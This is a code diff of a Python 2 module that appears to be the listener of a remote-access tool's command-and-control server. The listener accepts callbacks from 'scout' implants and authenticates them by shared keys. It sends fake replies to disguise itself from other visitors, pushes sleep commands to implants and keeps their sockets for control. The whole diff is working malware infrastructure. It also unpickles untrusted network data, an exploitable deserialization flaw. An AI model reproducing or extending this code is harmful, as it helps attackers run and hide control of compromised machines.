@@ -1,71 +1,91 @@
-import socket, pickle, cfg
-from modules.thread_kill import *
+import pickle
+import socket
+import threading
+import cfg
+import modules.thread_kill as thread_kill
+
 
 cfg.global_variables()
 
-
-def start_listening(port):
+def start_listener(ip, port, listener_key, fake_reply):
     try:
-        s = socket.socket()
-        s.bind(('0.0.0.0', port))
-        s.listen(100)
-        cfg.listeners_id += 1
-        local_id = cfg.listeners_id
-        cfg.db_listeners.append([local_id, str(port)])
-        print cfg.pos + 'Listener started and bound to port : ' + str(port)
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.bind((ip, port))
+        s.listen(1)
+        cfg.distributed_listener_id += 1
+        local_handler_id = cfg.distributed_listener_id
+        cfg.db_listeners.append([local_handler_id, ip , str(port), listener_key])
+        print cfg.pos + 'Started listener at : ' + ip + ':' + str(port)
         while True:
-            if kill_listener_thread(str(local_id)):
+            if not thread_kill.kill_listener_thread(str(local_handler_id)):
                 try:
                     s.settimeout(3)
-                    c, a = s.accept()
-                except socket.timeout:
+                    conn, addr = s.accept()
+                    conn.setblocking(1)
+                except (socket.timeout,socket.error):
                     continue
-                if c:
+                if conn:
+                    server_patrol_check = addr[0]
                     if cfg.whitelisted_ip:
-                        if a[0] in cfg.whitelisted_ip:
-                            pass
-                        else:
-                            c.shutdown(1)
-                            c.close()
+                        if server_patrol_check not in cfg.whitelisted_ip:
+                            conn.shutdown(1)
+                            conn.close()
                             continue
                     if cfg.blacklisted_ip:
-                        if a[0] in cfg.blacklisted_ip:
-                            c.shutdown(1)
-                            c.close()
+                        if server_patrol_check in cfg.blacklisted_ip:
+                            conn.shutdown(1)
+                            conn.close()
                             continue
-                        else:
-                            pass
                     try:
-                        c.setblocking(1)
-                        scouts_info = pickle.loads(c.recv(9999999))
-                    except:
-                        c.shutdown(1)
-                        c.close()
+                        conn.settimeout(5)
+                        scout_info = pickle.loads(conn.recv(9999999))
+                    except (socket.error, socket.timeout):
+                        conn.sendall(fake_reply)
+                        conn.shutdown(1)
+                        conn.close()
                         continue
-                    if scouts_info[0] == cfg.key:
-                        cfg.scouts_id += 1
-                        scouts_info[0] = cfg.scouts_id
-                        ip_addr = a[0]
-                        scouts_info.insert(1, ip_addr)
-                        scouts_info.append(c)
-                    else:
-                        c.shutdown(1)
-                        c.close()
-                    cfg.db_scouts.append(scouts_info)
-                    print '\n' + cfg.pos + 'Scout with assigned name : '+scouts_info[2]+' has reported back'
+                    try:
+                        if scout_info[0] == cfg.scout_key:
+                            if scout_info[1] == listener_key:
+                                scout_info.pop(0)
+                                cfg.scouts_id += 1
+                                scout_info[0] = cfg.scouts_id
+                                scout_info.insert(1, addr[0])
+                                scout_info.append(conn)
+                            else:
+                                conn.send('sleep 60' + cfg.End)
+                                buffer_out_reply = conn.recv(99999)
+                                continue
+                        else:
+                            conn.sendall(fake_reply)
+                            conn.shutdown(1)
+                            conn.close()
+                            continue
+                        cfg.db_scouts.append(scout_info)
+                        print '\n' + cfg.pos + 'Scout with Identifying name : ' + scout_info[2] + ' has reported back'
+                    except IndexError:
+                        conn.sendall(cfg.fake_reply)
+                        conn.shutdown(1)
+                        conn.close()
+                        continue
                 else:
-                    c.close()
-                    continue
+                    conn.shutdown(1)
+                    conn.close()
             else:
+                cfg.screenlock.acquire()
+                print cfg.note + 'Killing listener at : ' + ip + ':' + str(port)
                 s.close()
+                print cfg.pos + 'Killed listener succesfully'
+                cfg.screenlock.release()
                 return
     except Exception as e:
-        print '\n' + cfg.err + 'Error from listener : ' + str(e)
-        print '\n' + cfg.note + 'Killing failed listener thread...'
+        print cfg.err + 'Error from listener : ' + str(e)
+        print cfg.note + 'Killing listener in error state...'
         try:
             for i in range(len(cfg.db_listeners)):
-                if cfg.db_listeners[i][0] == local_id:
+                if cfg.db_listeners[i][0] == local_handler_id:
                     cfg.db_listeners.pop(i)
         except:
             pass
+        print cfg.pos + 'Killed listener succesfully'
         return
